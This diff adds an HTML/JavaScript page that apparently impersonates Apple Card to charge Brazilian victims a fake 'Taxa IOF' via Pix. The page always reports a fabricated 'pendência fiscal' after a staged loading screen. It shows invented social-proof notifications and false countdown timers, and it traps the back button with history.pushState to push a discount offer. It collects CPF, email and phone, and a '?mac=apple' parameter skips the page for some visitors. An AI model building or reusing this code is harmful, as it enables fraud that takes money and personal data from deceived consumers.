+        <div class="pix-modal-body">
+            <div class="pix-timer-bar">
+                <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"></path></svg>
+                <span class="ptb-text">O Pix expira em</span>
+                <span class="ptb-time" id="pixTimer">29:59</span>
+            </div>
+            <div class="pix-status" id="pixStatus">
+                <div class="ps-icon waiting" id="pixStatusIcon">
+                    <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"></path></svg>
+                </div>
+                <div class="ps-title"><span class="pix-status-dot waiting" id="pixStatusDot"></span> <span id="pixStatusText">Aguardando pagamento...</span></div>
+                <div class="ps-desc" id="pixStatusDesc">Escaneie o QR Code ou copie o código</div>
+            </div>
+            <div class="qr-container fade-in">
+                <div class="qr-wrapper">
+                    <img id="pixQrImage" src="" alt="QR Code Pix">
+                    <div class="qr-apple-logo">
+                        <svg viewBox="0 0 24 24" fill="#1D1D1F"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"></path></svg>
+                    </div>
+                </div>
+                <div class="qr-label">Escaneie com o app do seu banco</div>
+            </div>
+            <div class="copy-section fade-in">
+                <label>Pix Copia e Cola</label>
+                <div class="copy-box">
+                    <input type="text" class="copy-input" id="pixCopyPaste" readonly="" value="">
+                    <button class="copy-btn" id="copyBtn" onclick="copyPixCode()">Copiar</button>
+                </div>
+            </div>
+            <div class="pix-steps fade-in">
+                <div class="pix-steps-title">Como pagar:</div>
+                <div class="pix-step"><div class="pix-step-num">1</div><span>Abra o app do seu banco ou carteira digital</span></div>
+                <div class="pix-step"><div class="pix-step-num">2</div><span>Escolha pagar com Pix e escaneie o QR Code ou cole o código</span></div>
+                <div class="pix-step"><div class="pix-step-num">3</div><span>Confirme o pagamento. A aprovação é instantânea!</span></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ═══ Back Redirect Modal ═══ -->
+<div class="br-overlay" id="brOverlay">
+    <div class="br-modal">
+        <div class="br-emoji">⚠️</div>
+        <div class="br-title">Espera!</div>
+        <div class="br-desc">Conseguimos uma <strong>condição especial</strong> para você resolver a pendência fiscal agora mesmo.</div>
+        <div class="br-price" id="brPrice">R$ 12,90</div>
+        <button class="br-btn-accept" id="brAcceptBtn" onclick="acceptDiscount()">Aceitar desconto e resolver</button>
+        <button class="br-btn-decline" onclick="declineDiscount()">Não, obrigado</button>
+    </div>
+</div>
+
+<!-- ═══ Utmify Scripts ═══ -->
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script>
+// ═══════════════════════════════════════
+// CONFIG
+// ═══════════════════════════════════════
+const UPSELL_ID = 1;
+const PRICE_CENTS = 2645;           // R$ 26,45
+const DISCOUNT_PRICE_CENTS = 1990;  // R$ 19,90 (back-redirect)
+const PRODUCT_NAME = 'Taxa IOF';
+const NEXT_UPSELL = '../up2';
+const API_BASE = '../../api';       // relativo ao upsell
+
+let currentPrice = PRICE_CENTS;
+let currentTransactionId = null;
+let statusCheckInterval = null;
+let pixTimerInterval = null;
+let pixTimerSeconds = 30 * 60;
+
+// ═══════════════════════════════════════
+// UTM + LEAD DATA
+// ═══════════════════════════════════════
+const utmKeys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];
+const params = new URLSearchParams(window.location.search);
+utmKeys.forEach(k => { const v = params.get(k); if(v) localStorage.setItem(k, v); });
+
+const LeadData = {
+    _key: 'applecard_lead',
+    load() { try { return JSON.parse(localStorage.getItem(this._key) || '{}') } catch { return {} } },
+    update(d) { const c = this.load(); const u = {...c, ...d, updated_at: Date.now()}; localStorage.setItem(this._key, JSON.stringify(u)); return u; }
+};
+
+// Preencher nome no card
+const leadData = LeadData.load();
+const nome = params.get('nome') || leadData.nome || leadData.name || '';
+if (nome) {
+    document.getElementById('cardName').textContent = nome.toUpperCase();
+}
+
+// Preencher limite se vier na URL
+const limite = params.get('limite') || leadData.limite || '4750';
+const limiteNum = parseInt(limite) || 4750;
+document.getElementById('limiteValue').textContent = 'R$ ' + limiteNum.toLocaleString('pt-BR') + ',00';
+
+// ═══════════════════════════════════════
+// LOADING SCREEN (2.5s)
+// ═══════════════════════════════════════
+const loadingMsgs = [
+    'Verificando operação...',
+    'Consultando pendências...',
+    'Pendência fiscal encontrada'
+];
+let loadStep = 0;
+
+function runLoading() {
+    const bar = document.getElementById('loadingBar');
+    const msg = document.getElementById('loadingMsg');
+    
+    const steps = [
+        { width: '35%', delay: 0 },
+        { width: '70%', delay: 800 },
+        { width: '100%', delay: 1600 }
+    ];
+    
+    steps.forEach((step, i) => {
+        setTimeout(() => {
+            bar.style.width = step.width;
+            msg.textContent = loadingMsgs[i] || loadingMsgs[loadingMsgs.length - 1];
+        }, step.delay);
+    });
+    
+    setTimeout(() => {
+        document.getElementById('loadingScreen').classList.add('hide');
+        document.getElementById('mainPage').style.display = '';
+        startMainTimer();
+        startSocialProof();
+        initScrollCta();
+        initBackRedirect();
+    }, 2500);
+}
+
+window.addEventListener('DOMContentLoaded', runLoading);
+
+// ═══════════════════════════════════════
+// MAIN COUNTDOWN TIMER (10 min)
+// ═══════════════════════════════════════
+let mainTimerSeconds = 10 * 60 - 1; // 09:59
+
+function startMainTimer() {
+    updateMainTimer();
+    setInterval(() => {
+        if (mainTimerSeconds > 0) {
+            mainTimerSeconds--;
+            updateMainTimer();
+        }
+    }, 1000);
+}
+
+function updateMainTimer() {
+    const m = Math.floor(mainTimerSeconds / 60);
+    const s = mainTimerSeconds % 60;
+    document.getElementById('mainTimer').textContent = 
+        `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+}
+
+// ═══════════════════════════════════════
+// SOCIAL PROOF NOTIFICATIONS
+// ═══════════════════════════════════════
+const proofs = [
+    {name:'Maria S.',city:'São Paulo'},{name:'João P.',city:'Rio de Janeiro'},
+    {name:'Ana C.',city:'Belo Horizonte'},{name:'Carlos M.',city:'Curitiba'},
+    {name:'Fernanda L.',city:'Salvador'},{name:'Pedro R.',city:'Brasília'},
+    {name:'Juliana A.',city:'Recife'},{name:'Lucas D.',city:'Porto Alegre'},
+    {name:'Camila F.',city:'Fortaleza'},{name:'Rafael N.',city:'Goiânia'}
+];
+const spActions = ['resolveu a pendência agora','pagou o IOF há 2 min','liberou o cartão agora','concluiu o pagamento via Pix'];
+let proofIdx = 0;
+
+function startSocialProof() {
+    setTimeout(() => showProof(), 4000);
+    setInterval(() => showProof(), 12000);
+}
+
+function showProof() {
+    const p = proofs[proofIdx % proofs.length];
+    const a = spActions[Math.floor(Math.random() * spActions.length)];
+    const el = document.getElementById('spText');
+    const toast = document.getElementById('socialProof');
+    
+    el.innerHTML = `<strong>${p.name}</strong> de ${p.city} ${a}`;
+    toast.classList.add('show');
+    
+    setTimeout(() => toast.classList.remove('show'), 5000);
+    proofIdx++;
+}
+
+// ═══════════════════════════════════════
+// FIXED CTA ON SCROLL
+// ═══════════════════════════════════════
+function initScrollCta() {
+    const cta = document.getElementById('fixedCta');
+    window.addEventListener('scroll', () => {
+        cta.classList.add('show');
+    });
+}
+
+// ═══════════════════════════════════════
+// FAQ
+// ═══════════════════════════════════════
+function toggleFaq(el) {
+    const answer = el.nextElementSibling;
+    const isOpen = el.classList.contains('open');
+    
+    // Fechar todos
+    document.querySelectorAll('.faq-q.open').forEach(q => {
+        q.classList.remove('open');
+        q.nextElementSibling.classList.remove('open');
+    });
+    
+    if (!isOpen) {
+        el.classList.add('open');
+        answer.classList.add('open');
+    }
+}
+
+// ═══════════════════════════════════════
+// PIX GENERATION (calls our API)
+// ═══════════════════════════════════════
+async function generatePix() {
+    const btn = document.getElementById('payBtn');
+    btn.classList.add('loading');
+    btn.disabled = true;
+
+    const utm = {};
+    utmKeys.forEach(k => { const v = localStorage.getItem(k); if (v) utm[k] = v; });
+
+    const ld = LeadData.load();
+    const payload = {
+        amount: currentPrice,
+        payerName: nome || ld.nome || ld.name || 'Cliente',
+        email: params.get('email') || ld.email || '',
+        phone: params.get('telefone') || ld.telefone || ld.phone || '',
+        document: params.get('cpf') || ld.cpf || ld.document || '',
+        productName: PRODUCT_NAME,
+        utm: utm
+    };
+
+    try {
+        const res = await fetch(`${API_BASE}/pix.php`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        const result = await res.json();
+
+        if (result.success) {
+            currentTransactionId = result.transactionId;
+            
+            LeadData.update({
+                upp1_transaction: result.transactionId,
+                upp1_amount: currentPrice,
+                upp1_timestamp: Date.now()
+            });
+
+            document.getElementById('pixQrImage').src = result.qrCodeImage || '';
+            document.getElementById('pixCopyPaste').value = result.pixCopyPaste || '';
+
+            openPixModal();
+            startStatusCheck();
+            startPixTimer();
+        } else {
+            alert('Erro ao gerar o Pix: ' + (result.error || 'Tente novamente'));
+        }
+    } catch (err) {
+        console.error('Erro:', err);
+        alert('Erro de conexão. Tente novamente.');
+    } finally {
+        btn.classList.remove('loading');
+        btn.disabled = false;
+    }
+}
+
+// ═══════════════════════════════════════
+// PIX MODAL
+// ═══════════════════════════════════════
+function openPixModal() {
+    document.getElementById('pixOverlay').classList.add('active');
+    document.body.style.overflow = 'hidden';
+}
+
+function closePixModal() {
+    document.getElementById('pixOverlay').classList.remove('active');
+    document.body.style.overflow = '';
+}
+
+document.getElementById('pixOverlay').addEventListener('click', function(e) {
+    if (e.target === this) closePixModal();
+});
+
+// Copy
+function copyPixCode() {
+    const code = document.getElementById('pixCopyPaste').value;
+    if (!code) return;
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(code).then(showCopied).catch(fallbackCopy);
+    } else { fallbackCopy(); }
+}
+
+function fallbackCopy() {
+    const input = document.getElementById('pixCopyPaste');
+    input.select(); input.setSelectionRange(0, 99999);
+    document.execCommand('copy'); showCopied();
+}
+
+function showCopied() {
+    const btn = document.getElementById('copyBtn');
+    btn.textContent = '✓ Copiado!'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copiar'; btn.classList.remove('copied'); }, 3000);
+}
+
+// Pix Timer
+function startPixTimer() {
+    pixTimerSeconds = 30 * 60;
+    if (pixTimerInterval) clearInterval(pixTimerInterval);
+    pixTimerInterval = setInterval(updatePixTimer, 1000);
+    updatePixTimer();
+}
+
+function updatePixTimer() {
+    const m = Math.floor(pixTimerSeconds / 60);
+    const s = pixTimerSeconds % 60;
+    document.getElementById('pixTimer').textContent = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+    if (pixTimerSeconds > 0) pixTimerSeconds--;
+    else { document.getElementById('pixTimer').textContent = 'EXPIRADO'; clearInterval(pixTimerInterval); stopStatusCheck(); }
+}
+
+// ═══════════════════════════════════════
+// STATUS POLLING
+// ═══════════════════════════════════════
+function startStatusCheck() {
+    if (statusCheckInterval) clearInterval(statusCheckInterval);
+    statusCheckInterval = setInterval(checkPaymentStatus, 4000);
+    setTimeout(checkPaymentStatus, 3000);
+}
+
+function stopStatusCheck() {
+    if (statusCheckInterval) { clearInterval(statusCheckInterval); statusCheckInterval = null; }
+}
+
+async function checkPaymentStatus() {
+    if (!currentTransactionId) return;
+    try {
+        const res = await fetch(`${API_BASE}/status.php?id=${currentTransactionId}`);
+        const result = await res.json();
+        if (result.status === 'APPROVED') {
+            stopStatusCheck();
+            if (pixTimerInterval) clearInterval(pixTimerInterval);
+            showPaymentApproved();
+        }
+    } catch (err) { console.error('Erro status:', err); }
+}
+
+function showPaymentApproved() {
+    const statusIcon = document.getElementById('pixStatusIcon');
+    statusIcon.className = 'ps-icon paid';
+    statusIcon.innerHTML = '<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>';
+
+    document.getElementById('pixStatusDot').className = 'pix-status-dot paid';
+    document.getElementById('pixStatusText').textContent = 'Pagamento confirmado!';
+    document.getElementById('pixStatusDesc').textContent = 'Redirecionando...';
+    document.getElementById('pixStatus').style.background = 'rgba(52,199,89,.08)';
+
+    LeadData.update({ upp1_paid: true, upp1_paid_at: Date.now() });
+
+    // Redirecionar para o próximo upsell após 2.5s
+    setTimeout(() => {
+        window.location.href = buildUrl(NEXT_UPSELL);
+    }, 2500);
+}
+
+// ═══════════════════════════════════════
+// BACK REDIRECT
+// ═══════════════════════════════════════
+let brShown = false;
+
+function initBackRedirect() {
+    // Push fake state
+    history.pushState(null, '', window.location.href);
+    
+    window.addEventListener('popstate', () => {
+        history.pushState(null, '', window.location.href);
+        if (!brShown) showBackRedirect();
+    });
+}
+
+function handleBack() {
+    if (!brShown) showBackRedirect();
+    else goToNextUpsell();
+}
+
+function handleDecline() {
+    if (!brShown) showBackRedirect();
+    else goToNextUpsell();
+}
+
+function showBackRedirect() {
+    brShown = true;
+    document.getElementById('brOverlay').classList.add('active');
+    document.body.style.overflow = 'hidden';
+}
+
+function acceptDiscount() {
+    // Aplica desconto
+    currentPrice = DISCOUNT_PRICE_CENTS;
+    const priceText = formatPrice(DISCOUNT_PRICE_CENTS);
+    
+    document.getElementById('payPrice').textContent = priceText;
+    document.getElementById('payPriceDisplay').textContent = priceText;
+    document.getElementById('fixedPrice').textContent = priceText;
+    document.getElementById('iofValue').textContent = priceText;
+    
+    // Fechar modal back-redirect
+    document.getElementById('brOverlay').classList.remove('active');
+    document.body.style.overflow = '';
+    
+    // Scroll pro pagamento
+    document.querySelector('.pay-section').scrollIntoView({ behavior: 'smooth' });
+}
+
+function declineDiscount() {
+    document.getElementById('brOverlay').classList.remove('active');
+    document.body.style.overflow = '';
+    goToNextUpsell();
+}
+
+// ═══════════════════════════════════════
+// NAVIGATION HELPERS
+// ═══════════════════════════════════════
+function buildUrl(base, extra = {}) {
+    const u = new URL(base, window.location.href);
+    new URLSearchParams(window.location.search).forEach((v, k) => u.searchParams.set(k, v));
+    Object.entries(extra).forEach(([k, v]) => { if (v) u.searchParams.set(k, v); });
+    return u.toString();
+}
+
+function goToNextUpsell() {
+    window.location.href = buildUrl(NEXT_UPSELL);
+}
+
+function formatPrice(cents) {
+    return 'R$ ' + (cents / 100).toFixed(2).replace('.', ',');
+}
+
+// ═══════════════════════════════════════
+// COOKIE (mark visited)
+// ═══════════════════════════════════════
+function setCookie(name, value, days) {
+    const d = new Date();
+    d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
+    document.cookie = `${name}=${value};expires=${d.toUTCString()};path=/`;
+}
+setCookie('apple_upp_' + UPSELL_ID, 'visited', 30);
+
+// Auto-skip mode (?mac=apple)
+if(params.get('mac')==='apple'){setTimeout(()=>{window.location.href=buildUrl(NEXT_UPSELL);},2000);}
+
+</script>
+
+
+</body></html>
